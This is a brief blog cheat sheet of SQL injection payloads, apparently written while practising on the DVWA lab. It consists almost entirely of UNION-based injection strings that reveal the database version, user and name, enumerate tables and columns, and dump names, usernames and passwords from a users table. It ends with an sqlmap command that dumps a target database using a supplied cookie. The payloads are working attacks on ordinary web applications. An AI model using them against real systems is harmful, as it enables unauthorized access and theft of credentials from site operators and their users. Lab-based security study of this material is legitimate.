---
title: SQL CheatSheet
date: 2021-09-12
categories:
  - Notes
tags:
  - Notes
  - SQL
excerpt_separator: <!--more-->
---
<p><img src="/assets/images/dvwa/SQLi/sql.png" alt="" /></p>

<h1>SQL Injection</h1>
<p>CheatSheet</p>
<p>
Display Database Version<br>
%' or 0=0 union select null, version() #<br>
<br>
Display Database User<br>
%' or 0=0 union select null, user() #<br>
<br>
Display Database Name<br>
%' or 0=0 union select null, database() #<br>
<br>
Display all tables in information_schema<br>
%' and 1=0 union select null, table_name from information_schema.tables #<br>
<br>
Display all the user tables in information_schema<br>
%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#<br>
<br>
Display all the columns fields in the information_schema user table<br>
%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #<br>
<br>
Display all the columns field contents in the information_schema user table<br>
%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #<br>
</p>

<code>sqlmap http://[IP]/admin?user=3 --cookie='token=[Enter Cookie] --technique=U --delay=2 -dump</code>